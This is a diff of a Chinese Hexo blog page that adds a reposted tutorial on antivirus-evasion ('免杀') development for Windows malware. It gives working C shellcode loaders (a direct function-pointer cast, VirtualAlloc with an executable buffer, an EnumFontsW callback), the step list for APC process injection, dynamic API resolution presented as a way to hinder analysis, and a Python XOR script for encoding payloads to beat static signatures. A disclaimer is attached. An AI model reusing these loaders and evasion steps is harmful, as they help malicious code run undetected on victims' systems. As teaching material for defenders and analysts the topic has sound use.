@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   
-  <title>我的技术与生活——博客日志 | Hexo</title>
+  <title>我的技术与生活——免杀开发基础(1) | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
   <link rel="shortcut icon" href="/imgs/shortcut-icon.ico" type="image/x-icon">
   <link rel="stylesheet" href="/css/public.css" />
@@ -16,7 +16,7 @@
 
   <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
   <script>
-    document.title = `我的技术与生活——博客日志`
+    document.title = `我的技术与生活——免杀开发基础(1)`
   </script>
 <meta name="generator" content="Hexo 7.1.1"></head>
 
@@ -351,24 +351,71 @@
 
 <div class="article-container">
   <div class="article">
-    <h1 class="article-title">博客日志</h1>
+    <h1 class="article-title">免杀开发基础(1)</h1>
     <div class="article-info">
       <div class="article-info--item">
         <div class="article-info--info">
           
+          <div class="article-info--categories">
+            <span>分类：</span>
+            <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+          </div>
           
-          <p class="article-info--date">日期：2024-04-02 17:08:11</p>
+          
+          <div class="article-info--tags">
+            <span>标签：</span>
+            <a class="tag-link" href="/tags/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" rel="tag">渗透学习</a>
+          </div>
+          
+          <p class="article-info--date">日期：2024-04-12 15:22:12</p>
         </div>
         <img src="/imgs/default-cover.webp" alt="" class="article-cover">
       </div>
     </div>
     <article class="article-content markdown-body">
-      
+      <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​                                                                                   <strong>免责声明</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">以下漏洞均已经上报漏洞平台。请勿利用文章内的相关技术从事非法测试。若因此产生一切后果与本博客及本人无关。</span><br></pre></td></tr></table></figure>
+
+<p>​                                                                                   <strong>分享声明</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">此篇博文为微信公众号小呆安全的404Xyunxi_师傅投稿的,经过本人同意,进行分享</span><br></pre></td></tr></table></figure>
+
+<h1 id="免杀开发基基础"><a href="#免杀开发基基础" class="headerlink" title="免杀开发基基础"></a>免杀开发基基础</h1><p>​	本文将探讨与Windows操作系统恶意软件开发相关的基本原理和技术，我们将从探索<strong>WinAPI</strong>开始，了解代码操作如何在恶意软件开发的背景下工作。我们将介绍<strong>动态加载函数</strong>和在代码中<strong>执行函数</strong>等内容。接下来，我们将研究模糊处理和有效负载编码。我们将使用<strong>XOR</strong>和<strong>AES</strong>加密等技术来使恶意代码更难被检测到。</p>
+<h2 id="动态函数加载和执行"><a href="#动态函数加载和执行" class="headerlink" title="动态函数加载和执行"></a><strong>动态函数加载和执行</strong></h2><p>​	是时候进行一些代码的操作了，我们要把代码分解清楚，这样你就能知道发生了什么。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int main(void) &#123;</span><br><span class="line">MessageBoxA(0, &quot;Foo Here.&quot;, &quot;info&quot;, 0);return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​	这是一个简单的程序。它使用<strong>MessageBoxA函数</strong>，该函数是<strong>Windows API</strong>的当中的一个。此函数显示一个带有指定文本和标题的对话框。在这段代码中，我们直接调用<strong>MessageBoxA函数</strong>来显示一个消息框。MessageBoxA函数在编译过程中<strong>静态链接到程序</strong>。这意味着函数的代码包含在程序中，因此不需要在运行时加载它。</p>
+<p>现在，让我们将其与以下代码进行对比：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int main(void) &#123;size_t get_MessageBoxA = (size_t)GetProcAddress( LoadLibraryA(&quot;USER32.dll&quot;), &quot;MessageBoxA&quot; );</span><br><span class="line">def_MessageBoxA msgbox_a = (def_MessageBoxA) get_MessageBoxA;</span><br><span class="line">msgbox_a(0, &quot;Foo Here.&quot;, &quot;info&quot;, 0);return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​	在这段代码中，我们采用了不同的方法。我们使用MessageBoxA函数动态加载并调用GetProcAddress函数。此函数在运行时从USER32.dll库中检索MessageBoxA函数的地址。</p>
+<p>​	为了使用这个动态加载的函数，我们定义了一个函数指针类型def_MessageBoxA，它与MessageBoxA函数的签名相匹配。然后我们将获得的函数地址转换为这个函数指针，并使用它来调用函数。</p>
+<p>​	那么，这与恶意软件有什么关系呢？通过动态加载函数，我们可以避免静态链接到可疑库，这意味着可以使得木马更加难以被分析。这些都是理解如何调整和操作代码的基本概念。</p>
+<p>calc.exe将调用win32 API函数：向操作系统发送请求以创建此进程并开始执行的进程。</p>
+<h2 id="Shellcode执行技术"><a href="#Shellcode执行技术" class="headerlink" title="Shellcode执行技术"></a><strong>Shellcode执行技术</strong></h2><p>Shellcode执行方式简介一下三种。</p>
+<p>1.最常见的一种加载shellcode的方法，使用指针来执行函数</p>
+<p>2.申请一段动态内存，然后把shellcode放进去，随后强转为一个函数类型指针，最后调用</p>
+<p>3.回调函数执行，申请一段动态内存，将shellcode拷贝进去，然后回调函数执行。</p>
+<h3 id="1-指针执行"><a href="#1-指针执行" class="headerlink" title="1.指针执行"></a>1.指针执行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">unsigned char buf[] =&quot;你的shellcode&quot;;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">​	((void(*)(void)) &amp; buf)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-申请内存指针执行"><a href="#2-申请内存指针执行" class="headerlink" title="2.申请内存指针执行"></a>2.申请内存指针执行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  char shellcode[] = &quot;你的shellcode&quot;;</span><br><span class="line">  void* zx = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">  memcpy(zx, shellcode, sizeof shellcode);</span><br><span class="line">  ((void(*)())zx)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-回调函数"><a href="#3-回调函数" class="headerlink" title="3.回调函数"></a>3.回调函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">unsigned char shellcode[] = &quot;shellcode&quot;;</span><br><span class="line">int main() &#123;</span><br><span class="line">LPVOID address = VirtualAlloc(NULL, sizeof(shellcode), MEM_RESERVE</span><br><span class="line">|MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">memcpy(address, shellcode, sizeof(shellcode));</span><br><span class="line">HDC dc = GetDC(NULL);</span><br><span class="line">EnumFontsW(dc, NULL, (FONTENUMPROCW)address, NULL);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="注入技术"><a href="#注入技术" class="headerlink" title="注入技术"></a><strong>注入技术</strong></h2><p>​	<strong>APC注入</strong>利用了异步过程调用。<strong>APC是一种软件中断</strong>，因为它们必须能够改变程序的主执行路径。例如，Windows API函数ReadFileEx 允许用户编写一些代码，这些代码将在I&#x2F;O操作完成时执行。为了实现这一点，I&#x2F;O操作必须找到一种方法来返回最初调用ReadFileEx的线程。这又通过将APC排队到进行I&#x2F;O调用的线程来实现。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.枚举线程和进程-ToolHelp 32 Snapshot，</span><br><span class="line">2.获取进程PID。获取目标进程的句柄- OpenProcess。</span><br><span class="line">3.在目标进程分配新内存- VirtualAllocEx。</span><br><span class="line">4.将有效负载写入新分配的内存- WriteProcessMemory。</span><br><span class="line">5.更改内存保护- VirtualProtectEx。</span><br><span class="line">6.对有效负载进行排队-挂起用户APC。</span><br><span class="line">7.等待例程将线程置于可报警状态，SleepEx（）、WaitForSingleObjectEx（）、WaitForMultipleObjectEx（）、Sleep（）。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://xiaoyunxi.oss-cn-zhangjiakou.aliyuncs.com/202404121525553.png"></p>
+<h2 id="shellcode加密手段"><a href="#shellcode加密手段" class="headerlink" title="shellcode加密手段"></a><strong>shellcode加密手段</strong></h2><p>采用异或加密，规避静态特征，以下是python加密脚本。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def xor_encrypt_decrypt(input_file, key):</span><br><span class="line">  with open(input_file, &#x27;rb&#x27;) as f:</span><br><span class="line">​    data = f.read()</span><br><span class="line">  # 进行异或操作</span><br><span class="line">  encrypted_data = bytes([byte ^ key for byte in data])</span><br><span class="line">  return encrypted_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">input_file = &#x27;payload.bin&#x27;</span><br><span class="line">key = 0xc5  # 这是加密/解密所使用的密钥</span><br><span class="line">encrypted_result = xor_encrypt_decrypt(input_file, key)</span><br><span class="line">print(&quot;加密结果:&quot;)</span><br><span class="line">print(encrypted_result)</span><br></pre></td></tr></table></figure>
+
+<p> <img src="https://xiaoyunxi.oss-cn-zhangjiakou.aliyuncs.com/202404121529980.png"></p>
+<p><strong>总结：这只是免杀的凤毛麟角，免杀不光是代码，还有灵活的思路。</strong></p>
+
     </article>
     
     <div class="read-nums">
       <!-- id 将作为查询条件 -->
-      <span id="log/logName.html" class="leancloud_visitors" data-flag-title="Your Article Title">
+      <span id="2024/04/12/免杀开发基础-1/" class="leancloud_visitors" data-flag-title="Your Article Title">
         <em class="post-meta-item-text">浏览量</em>
         <i class="leancloud-visitors-count"></i>
       </span>
@@ -384,8 +431,18 @@
     <div class="article-catelogue--wrapper">
       <div class="catelogue catelogue-1">
         <h3>目录</h3>
-        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%8D%E6%9D%80%E5%BC%80%E5%8F%91%E5%9F%BA%E5%9F%BA%E7%A1%80"><span class="toc-number">2.</span> <span class="toc-text">免杀开发基基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E5%87%BD%E6%95%B0%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C"><span class="toc-number">2.1.</span> <span class="toc-text">动态函数加载和执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shellcode%E6%89%A7%E8%A1%8C%E6%8A%80%E6%9C%AF"><span class="toc-number">2.2.</span> <span class="toc-text">Shellcode执行技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%8C%87%E9%92%88%E6%89%A7%E8%A1%8C"><span class="toc-number">2.2.1.</span> <span class="toc-text">1.指针执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%94%B3%E8%AF%B7%E5%86%85%E5%AD%98%E6%8C%87%E9%92%88%E6%89%A7%E8%A1%8C"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.申请内存指针执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0"><span class="toc-number">2.2.3.</span> <span class="toc-text">3.回调函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF"><span class="toc-number">2.3.</span> <span class="toc-text">注入技术</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcode%E5%8A%A0%E5%AF%86%E6%89%8B%E6%AE%B5"><span class="toc-number">2.4.</span> <span class="toc-text">shellcode加密手段</span></a></li></ol></li></ol>
       </div>
+      
+        <div class="catelogue catelogue-2">
+           
+          
+            <p>
+              <span>下一篇</span>
+              <a href="/2024/04/09/如何从小程序到教务系统/">如何从小程序到教务系统</a>
+            </p>
+          
+        </div>
       
     </div>
   </div>
@@ -404,7 +461,7 @@
     recordIP: config.recordIP,
     visitor: config.visitor,
     enableQQ: config.enableQQ,
-    path: 'log/logName.html'
+    path: '2024/04/12/免杀开发基础-1/'
   })
 </script>
 
